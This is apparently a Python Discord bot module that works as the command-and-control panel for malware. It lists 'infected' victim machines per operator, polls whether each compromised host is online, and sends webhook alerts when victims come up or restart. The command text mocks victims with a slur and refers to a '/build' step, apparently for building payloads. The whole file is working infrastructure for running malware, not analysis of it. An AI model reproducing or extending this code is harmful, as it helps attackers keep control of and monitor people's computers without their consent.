import asyncio
import os

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands, tasks

import machines

POLL_EVERY = 20
POLL_MAX = 45
MAX_POLLERS = 3

WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")


async def notify_up(alias):
	await notify(alias, f"{alias} is up", 0x2ecc71)


async def notify(alias, msg, color):
	if not WEBHOOK_URL:
		return
	try:
		async with aiohttp.ClientSession() as s:
			await s.post(WEBHOOK_URL, json={
				"embeds": [{"description": msg, "color": color}]
			})
	except Exception:
		pass


class MachinesCog(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
		self.pollers = set()
		self.online = set()
		self.restarting = set()
		self.primed = False

	async def cog_load(self):
		self.watch_machines.start()

	async def cog_unload(self):
		self.watch_machines.cancel()

	async def check_machine(self, m, announce):
		mid = m["mid"]
		alias = m["alias"]

		alive = await machines.presence(mid)
		if alive:
			if announce and mid not in self.online:
				await notify_up(alias)
			self.online.add(mid)
			self.restarting.discard(mid)
			machines.clear_restart(mid)
			machines.touch(alias)
			return True

		self.online.discard(mid)
		if await machines.restarting(mid) and mid not in self.restarting:
			self.restarting.add(mid)
			machines.touch(alias)
			await notify(alias, f"{alias} is restarting, hold on", 0xf39c12)
		return False

	@tasks.loop(seconds=POLL_EVERY)
	async def watch_machines(self):
		for m in machines.load().get("machines", []):
			try:
				await self.check_machine(m, self.primed)
			except Exception:
				pass
		self.primed = True

	@app_commands.command(name="machines", description="list infected retards")
	async def machines_cmd(self, interaction):
		rows = machines.all_for(interaction.user.id)
		if not rows:
			await interaction.response.send_message("no ones hit yet buddy", ephemeral=True)
			return

		await interaction.response.defer(ephemeral=True)

		embed = discord.Embed(title="machines", color=0x000000)
		for m in rows:
			alive = await machines.presence(m["mid"])
			if alive:
				machines.touch(m["alias"])
				m["last_seen"] = machines.now()
			seen = "never" if not alive else f"<t:{m['last_seen']}:R>"
			embed.add_field(
				name=m["alias"],
				value=f"mid `{m['mid']}`\nlast seen {seen}\nsessions {m['sessions']}\n"
					f"{'online' if alive else 'offline'}",
				inline=False)
		await interaction.followup.send(embed=embed)

	@app_commands.command(name="poll", description="poll the machine to come up")
	@app_commands.describe(alias="machine name from /build")
	async def poll(self, interaction, alias: str):
		m = machines.get(alias, interaction.user.id)
		if not m:
			await interaction.response.send_message("??? wtf are u doing", ephemeral=True)
			return
		if len(self.pollers) >= MAX_POLLERS:
			await interaction.response.send_message("too many pollers, try later", ephemeral=True)
			return
		if interaction.user.id in self.pollers:
			await interaction.response.send_message("you already have a poll running", ephemeral=True)
			return

		await interaction.response.send_message(f"installing poller for `{alias}`", ephemeral=True)
		self.pollers.add(interaction.user.id)

		async def wait_online():
			try:
				for _ in range(POLL_MAX):
					if await self.check_machine(m, True):
						return
					await asyncio.sleep(POLL_EVERY)
			finally:
				self.pollers.discard(interaction.user.id)

		asyncio.create_task(wait_online())


async def setup(bot):
	await bot.add_cog(MachinesCog(bot))
